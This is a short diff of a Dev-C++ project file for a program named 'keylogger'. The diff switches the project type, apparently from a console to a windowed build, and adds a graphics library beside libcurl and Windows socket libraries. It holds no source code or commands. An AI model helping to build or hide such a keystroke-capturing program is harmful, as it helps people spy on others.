@@ -1,7 +1,7 @@
 [Project]
 FileName=keylogger.dev
 Name=keylogger
-Type=1
+Type=0
 Ver=2
 ObjFiles=
 Includes=
@@ -11,7 +11,7 @@ ResourceIncludes=
 MakeIncludes=
 Compiler=-DCURL_STATICLIB_@@_
 CppCompiler=
-Linker=libs/libcurl.a_@@_libs/libwsock32.a_@@_libs/libz.a_@@_libs/libwldap32.a_@@_libs/libws2_32.a_@@__@@_
+Linker=libs/libcurl.a_@@_libs/libwsock32.a_@@_libs/libz.a_@@_libs/libwldap32.a_@@_libs/libws2_32.a_@@_libs/libgdi32.a_@@_
 IsCpp=0
 Icon=
 ExeOutput=
